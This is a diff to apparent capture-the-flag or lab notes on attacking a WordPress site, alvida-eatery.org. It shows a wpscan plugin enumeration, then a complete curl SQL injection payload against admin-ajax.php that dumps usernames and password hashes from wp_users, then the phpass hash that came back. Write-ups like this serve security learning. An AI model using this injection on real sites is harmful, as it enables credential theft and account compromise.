@@ -102,8 +102,9 @@ wpscan --url http://alvida-eatery.org --enumerate p
 Find vulnerability in plugins
 - use this vuln: https://wpscan.com/vulnerability/c1620905-7c31-4e62-80f5-1d9635be11ad
 - example hashes: https://hashcat.net/wiki/doku.php?id=example_hashes
+```
 curl http://alvida-eatery.org/wp-admin/admin-ajax.php?action=get_question&question_id=1%20union%20select%201%2C1%2Cchar(116%2C101%2C120%2C116)%2Cuser_login%2Cuser_pass%2C0%2C0%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%20from%20wp_users 
-
+```
 found hash
 ```
 $P$BINTaLa8QLMqeXbQtzT2Qfizm2P/nI0
